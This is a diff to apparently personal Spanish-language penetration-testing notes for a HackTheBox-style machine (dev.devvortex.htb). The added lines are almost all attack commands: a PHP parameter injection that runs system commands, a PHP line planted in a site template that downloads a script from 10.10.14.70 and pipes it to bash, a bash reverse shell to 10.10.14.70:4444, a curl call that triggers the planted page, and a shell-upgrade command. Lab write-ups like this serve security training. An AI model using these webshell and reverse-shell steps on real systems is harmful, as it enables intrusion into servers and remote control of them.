@@ -129,4 +129,23 @@ Nos llegara una request a un subdominio con los datos del comando ejecutado.
 
 ################## Code injection en un parametro php:
 podemos crear una webshell en un parámetro php que ejecuta código de la siguiente manera:
-parameter = ${system($_GET[cmd])}&cmd=
+
+        parameter = ${system($_GET[cmd])}&cmd=
+
+
+### Obteniendo una shell 2:
+
+##### agregar en una página un código php:
+        <?php system("curl 10.10.14.70:8080/rev.sh|bash"); ?>
+
+##### crear la shell
+        echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh
+
+##### iniciar un servidor python y un netcat
+
+##### Llamar a la páginacon curl:
+
+        curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
+
+##### Obtener una mejor shell:
+        script /dev/null -c bash
